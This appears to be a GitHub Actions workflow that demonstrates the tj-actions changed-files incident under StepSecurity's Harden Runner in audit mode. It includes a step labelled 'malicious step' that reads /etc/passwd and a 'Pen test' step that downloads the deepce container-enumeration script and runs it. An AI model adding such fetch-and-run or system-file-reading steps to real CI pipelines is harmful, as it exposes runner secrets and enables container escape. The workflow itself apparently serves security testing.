name: "tj-action changed-files incident"

on:
  push:
    branches:
      - main

jobs:
  changed_files:
    runs-on: ubuntu-latest
    name: Test changed-files
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          
      - name: Harden Runner
        uses: step-security/harden-runner@v2
        with:
          disable-sudo: true
          egress-policy: audit
          
      - name: Get changed files
        id: changed-files
        uses: tj-actions/changed-files@v35

      - name: List all changed files
        run: |
          for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
            echo "$file was changed"
          done
          echo "hello" >> cont.txt
          
      - name: dummy_action
        run: |
          echo "hello world" && ls -la

      - name: malicious step
        run: |
          echo "pwned" && cat /etc/passwd
          
      - name: Pen test
        run: |
          cd /tmp; \
          wget https://github.com/stealthcopter/deepce/raw/master/deepce.sh; \ 
          chmod +x ./deepce.sh; \
          ./deepce.sh

